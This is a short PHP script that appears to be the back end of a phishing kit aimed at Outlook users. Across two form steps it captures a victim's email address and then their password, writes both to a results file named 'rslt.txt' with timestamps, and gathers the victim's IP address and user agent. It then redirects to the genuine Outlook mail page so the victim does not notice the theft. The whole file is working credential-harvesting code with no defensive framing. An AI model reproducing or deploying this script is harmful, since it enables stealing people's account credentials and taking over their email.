<?php
    if(isset($_POST['btn1'])){
        $email = $_POST['m'];

        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "----| New Detailz |-----\n";
            
        $message .= "Username            : ".$email."\n";
        $message .= "Date              : ".date("Y-m-d H:i:s")."\n";

        $fptr = fopen('../rslt.txt','a');
        fwrite($fptr,$message);
        fclose($fptr);
            
        header("Location: ../next.php?mail=$email");
    }
    if(isset($_POST['btn2'])){
        $passo = $_POST['p'];

        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];

        $message .= "Passo            : ".$passo."\n";
        $message .= "Date              : ".date("Y-m-d H:i:s")."\n";
        $message .= "=========================================";

        $fptr = fopen('../rslt.txt','a');
        fwrite($fptr,$message);
        fclose($fptr);
            
        header("Location: https://outlook.office.com/mail/");
    }
?>
